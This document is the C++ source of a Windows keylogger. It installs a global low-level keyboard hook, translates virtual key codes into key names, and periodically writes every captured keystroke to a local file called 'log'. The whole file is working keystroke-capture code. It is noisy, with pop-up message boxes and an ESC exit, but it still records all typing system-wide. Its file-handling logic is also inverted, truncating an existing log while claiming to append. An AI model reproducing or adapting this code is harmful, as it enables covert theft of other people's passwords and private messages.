#include <iostream>
#include <fstream>
#include <unistd.h>	
#include <Windows.h>
#include <map>
#include <stdlib.h>
using namespace std;

HHOOK hhk; // variable to store the HANDLE to the hook. Must be desclared globally
bool debug = false;
std::ofstream logFile;
std::string buffer = "";
std::string fileName = "log";
std::map<int, std::string> keyCodes = {
	{8, "BACKSPACE"},
	{9, "TAB"},
	{13, "ENTER"}, //0x0D
	{19, "PAUSE"},
	{20, "CAPS LOCK"},
	{27, "ESC"},
	{32, "SPACE"},
	{33, "PAGE UP"},
	{34, "PAGE DOWN"},
	{35, "END"},
	{36, "HOME"}, //0x24
	{37, "LEFT ARROW"},
	{38, "UP ARROW"},
	{39, "RIGHT ARROW"}, // 0x27
	{40, "DOWN ARROW"}, //0x28
	{44, "PRINT SCREEN"}, // 0x2C
	{45, "INSERT"}, //0x2D
	{46, "DELETE"}, //0x2E
	{48, "0"}, //0x30
	{49, "1"}, //0x31
	{50, "2"},
	{51, "3"},
	{52, "4"},
	{53, "5"},
	{54, "6"},
	{55, "7"},
	{56, "8"},
	{57, "9"}, //0x39
	{65, "a"}, //0x41
	{66, "b"},
	{67, "c"},
	{68, "d"},
	{69, "e"}, //0x45
	{70, "f"}, 
	{71, "g"},
	{72, "h"},
	{73, "i"},
	{74, "j"},
	{75, "k"},
	{76, "l"},
	{77, "m"},
	{78, "n"},
	{79, "o"},
	{80, "p"},
	{81, "q"},
	{82, "r"},
	{83, "s"},
	{84, "t"},
	{85, "u"},
	{86, "v"},
	{87, "w"},
	{88, "x"},
	{89, "y"},
	{90, "z"}, //0x5A
	{91, "LEFT WINDOWS"}, //0x5B
	{92, "RIGHT WINDOWS"},
	{96, "NUMERIC KEYPAD 0"}, //0x60
	{97, "NUMERIC KEYPAD 1"},
	{98, "NUMERIC KEYPAD 2"},
	{99, "NUMERIC KEYPAD 3"},
	{100, "NUMERIC KEYPAD 4"},
	{101, "NUMERIC KEYPAD 5"},
	{102, "NUMERIC KEYPAD 6"},
	{103, "NUMERIC KEYPAD 7"},
	{104, "NUMERIC KEYPAD 8"},
	{105, "NUMERIC KEYPAD 9"}, //0x69
	{106, "NUMERIC KEYPAD MULTILPY"},
	{107, "NUMERIC KEYPAD ADD"},
	{108, "NUMERIC KEYPAD SEPARATOR"}, //0x6C
	{109, "NUMERIC KEYPAD SUBTRACT"},
	{110, "NUMERIC KEYPAD DECIMAL"},
	{111, "NUMERIC KEYPAD DIVIDE"}, //0x6E
	{112, "F1"}, // 0x70
	{113, "F2"},
	{114, "F3"},
	{115, "F4"},
	{116, "F5"},
	{117, "F6"},
	{118, "F7"},
	{119, "F8"},
	{120, "F9"},
	{121, "F10"},
	{122, "F11"},
	{123, "F12"}, //0x7B
	{144, "NUM LOCK"}, //0x90
	{145, "SCROLL LOCK"},
	{160, "LEFT SHIFT"}, //0xA0
	{161, "RIGHT SHIFT"},
	{162, "LEFT CONTROL"},
	{163, "RIGHT CONTROL"},
	{164, "LEFT ALT"},
	{165, "RIGHT ALT"}, //0xA5
	{186, ";"},
	{187, "="}, //0xBB
	{188, ","}, //0xBC
	{189, "-"}, //0xBD
	{190, "."}, //0xBE
	{191, "/"}, //0xBF
	{192, "MISC ~"}, 
	{219, "{"}, //0xDB
	{220 ,"\\"}, //0xDC
	{221, "}"}, //0xDD
	{222, "'"}
};

bool fileExist (const std::string& name) {
	std::ifstream file(name.c_str());
	return bool(file.good());
}

LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT keyboardStruct;
	if (nCode >= 0){
		if (wParam == WM_KEYDOWN) {
			keyboardStruct = *((KBDLLHOOKSTRUCT*) lParam);
			buffer += keyCodes[keyboardStruct.vkCode];
			
			if (buffer.length() > 100) {
				logFile << buffer;
				buffer = "";
				MessageBox(NULL, "Written Buffer to File.", "Buffer Written", MB_ICONINFORMATION | MB_OK);
			}
			
			if (debug) {
				char debugBuff[125];
				sprintf(debugBuff, "key: %s\tvirtual key: %d\tscan code: %d", keyCodes[keyboardStruct.vkCode].c_str(), keyboardStruct.vkCode, keyboardStruct.scanCode);
				MessageBox(NULL, debugBuff, "Key Info", MB_ICONINFORMATION | MB_OK);
			}

			if (keyboardStruct.vkCode == 27) {
				PostQuitMessage (0);	
			}
		}
	}
	return CallNextHookEx(hhk, nCode, wParam, lParam);
}

int main(int argc, char **argv) {
	MSG msg;
	BOOL bRet;
	
	for (int i = 0; i < argc; i++) {
		if (strcmp(argv[i], "-d") == 0) {
			cout << "Starting program in debug mode." << endl;
			debug = true;
		}
	}
	
	if (!(fileExist (fileName))) {
		MessageBox(NULL, "New File Created", "New File", MB_ICONINFORMATION | MB_OK);
		logFile.open(fileName, std::ios_base::app);
	}
	else {
		MessageBox(NULL, "Appended to file.", "Appending File", MB_ICONINFORMATION | MB_OK);
		logFile.open(fileName, std::ios::out);
	}
	
	hhk = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack,  GetModuleHandle(NULL), 0);
	if (hhk != NULL) {
		if (debug) cout << "Press any char on the key. A popup window will display key pressed. When done press esc to exit." << endl;
		while(GetMessage(&msg, NULL, 0, 0) != 0) {
  			TranslateMessage( &msg );
  			DispatchMessage( &msg );
 		}
 		int status = UnhookWindowsHookEx(hhk);
 		
 		if (status == 0) {
 			DWORD errorMessageID = ::GetLastError();
 			LPSTR messageBuffer = nullptr;
 			size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
 			std::string message(messageBuffer, size);
 			LocalFree(messageBuffer);
 			cout << message << endl;
 			exit(1);
		 }
		 logFile.close();
	}
	else {
		DWORD errorMessageID = ::GetLastError();
		LPSTR messageBuffer = nullptr;
		size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
		std::string message(messageBuffer, size);
		LocalFree(messageBuffer);
		cout << message << endl;
		exit(1);
	}
	if (debug) cout << "Exiting program." << endl;
	return 0;
}
